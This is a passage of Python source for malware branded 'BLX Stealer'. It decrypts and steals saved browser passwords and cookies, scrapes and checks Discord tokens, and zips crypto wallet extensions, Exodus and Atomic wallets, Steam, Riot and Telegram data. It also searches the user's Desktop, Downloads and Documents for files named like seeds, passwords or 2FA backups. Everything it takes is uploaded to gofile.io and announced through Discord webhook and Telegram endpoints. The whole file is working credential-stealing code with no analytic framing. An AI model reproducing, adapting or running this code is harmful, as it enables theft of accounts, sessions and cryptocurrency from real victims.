                    "title": "BLX Stealer | Passwords",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "BLX Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                    }
                }
            ],
            "username": "BLX Stealer | t.me/blxstealer",
            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
            "attachments": []
            }
        urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                "color": color,
                "fields": [
                    {
                    "name": "I Found This Files;:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "BLX Stealer | Files"
                },
                "footer": {
                    "text": "BLX Stealer",
                    "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                }
                }
            ],
            "username": "BLX Stealer | t.me/blxstealer",
            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
            "attachments": []
            }
        urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        return

def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\lx{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--BLXStealer-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0K3Ns = ''
def g3770K3N(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if not token in T0K3Ns:
                                # print(token)
                                T0K3Ns += token
                                UP104D70K3N(token, path)

P455w = []
def g37P455W(path, arg):
    global P455w, P455WC0UNt
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in p45WW0rDs: p45WW0rDs.append(old)
            P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
            P455WC0UNt += 1
    wr173F0rF113(P455w, 'passw')

C00K13s = []    
def g37C00K13(path, arg):
    global C00K13s, C00K1C0UNt
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in c00K1W0rDs: c00K1W0rDs.append(old)
            C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
            C00K1C0UNt += 1
    wr173F0rF113(C00K13s, 'cook')

def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines()if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0K3Ns
                    tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if CH3CK70K3N(tokenDecoded):
                        if not tokenDecoded in T0K3Ns:
                            # print(token)
                            T0K3Ns += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
        # print(WalletsZip, G4M1N6Z1p, OtherZip)

    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236> •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(W411375Z1p) == 0:
        ga = "<:blackgengar:1111366900690202624>  •  Gaming\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": g108411NF0(),
        "embeds": [
            {
            "title": "BLX Stealer | Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": color,
            "footer": {
                "text": "BLX Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
            }
            }
        ],
        "username": "BLX Stealer | t.me/blxstealer",
        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
        "attachments": []
    }
    urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)


def Z1P73136r4M(path, arg, procc):
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    O7H3rZ1p.append([arg, lnik])

def Z1P7H1N65(path, arg, procc):
    pathC = path
    name = arg
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_Edge"
        pathC = path + arg

    if "djclckkglechooblngghdinmeemkbgci" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_OperaGX"
        pathC = path + arg

    if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Binance_{browser}"
        pathC = path + arg

    if "hnfanknocfeofbddgcijnmhnfnkdnaad" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Coinbase_{browser}"
        pathC = path + arg

    if "egjidjbpglichdcondbcbdnbeeppgdph" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Trust_{browser}"
        pathC = path + arg

    if "bfnaelmomeimhlpmgjnjophhpkkoljpa" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Phantom_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg or "koplchlghecd" in arg or "aelbohpjbbld" in arg or "nocfeofbddgc" in arg or "bpglichdcond" in arg or "momeimhlpmgj" in arg:
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])
        

def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    br0W53rP47H5 = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/ejbalbakoplchlghecdalmeeeajnimhm"              ]
    ]

    d15C0rDP47H5 = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    P47H570Z1P = [
        [f"{roaming}/Atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g3770K3N, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in d15C0rDP47H5: 
        a = threading.Thread(target=G37D15C0rD, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g37P455W, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=G47H3rZ1P5, args=[br0W53rP47H5, P47H570Z1P, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TrU57(C00K13s)
    if DETECTED == True: return

    for thread in Threadlist: 
        thread.join()
    global uP7Hs
    uP7Hs = []

    for file in ["lxpassw.txt", "lxcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        UP104D(file.replace(".txt", ""), uP104D7060F113(os.getenv("TEMP") + "\\" + file))


def uP104D7060F113(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

def K1W1F01D3r(pathF, keywords):
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uP104D7060F113(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    K1W1F113s.append(["folder", pathF + "/", ffound])

K1W1F113s = []
def K1W1F113(path, keywords):
    global K1W1F113s
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uP104D7060F113(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    K1W1F01D3r(target, keywords)
                    break

    K1W1F113s.append(["folder", path, fifound])

def K1W1():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "seed",
        "seedphrase"
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "wallets",
        "crypto",
        "exodus",
        "seed",
        "seedphrase"
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p

k3YW0rd = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

C00K1C0UNt, P455WC0UNt = 0, 0
c00K1W0rDs = []
p45WW0rDs = []

W411375Z1p = [] # [Name, Link]
G4M1N6Z1p = []
O7H3rZ1p = []

G47H3r411()
DETECTED = TrU57(C00K13s)
# DETECTED = False
if not DETECTED:
    wikith = K1W1()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in K1W1F113s:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f" <:openfolderblackandwhitevariant:1042409305254670356> {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─<:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    UP104D("kiwi", filetext)
